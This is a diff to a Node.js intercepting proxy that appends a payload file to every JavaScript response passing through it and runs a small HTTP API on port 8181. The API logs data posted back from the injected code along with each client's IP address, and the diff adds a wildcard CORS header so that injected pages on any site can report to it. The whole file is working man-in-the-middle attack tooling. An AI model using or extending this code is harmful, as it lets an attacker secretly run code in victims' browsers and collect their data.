@@ -9,16 +9,21 @@ require('http').createServer(API_onRequest).listen(8181);
 // js to be injected into others js
 var payload = require("fs").readFileSync("./pl.js");
 
+/* prevent connections to internal LAN */
+proxy.tamper(/192\.168/, breakConnection);
+proxy.tamper(/127\.0/, breakConnection);
+proxy.tamper(/localhost/, breakConnection);
+
  /* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     WEB PROXY SETTINGS
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
 proxy.tamper(/\.js/, function(request){
     delete request.headers['accept-encoding'];
     request.onResponse(function (response) {
-        console.log("code injected: " + payload);
+        //console.log("code injected: " + payload);
         response.body += payload;
         response.headers['content-length'] = response.body.length;
-        response.headers["Cache-Control"] = "max-age=31536000"; // 1 year
+        //response.headers["Cache-Control"] = "max-age=86400"; // 24 hrs
         response.complete();
     });
 });
@@ -34,8 +39,9 @@ function API_onRequest(request, response)
           body += data.toString();
         });
         request.on("end", function(data){
-           console.log("event detected: " + request.url + ": " + body);
+           console.log("[" + request.connection.remoteAddress + "] event detected: " + request.url + ": " + body + "\r\n\r\n");
         });
+        response.writeHead(200,{"Access-Control-Allow-Origin":"*"});
         response.end("ok");
     }
     else {
@@ -43,8 +49,18 @@ function API_onRequest(request, response)
     }
 }
 
+/* Helper functions */
+
+// web api helper function
 function notFound(response)
 {
     response.writeHead(200,{"content-type" : "text/html"});
     response.end("<h2>Not found</h2>");
+}
+
+// web proxy helper function
+function breakConnection(request)
+{
+    request.url = "****";
+    request.headers["host"] = "****";
 }
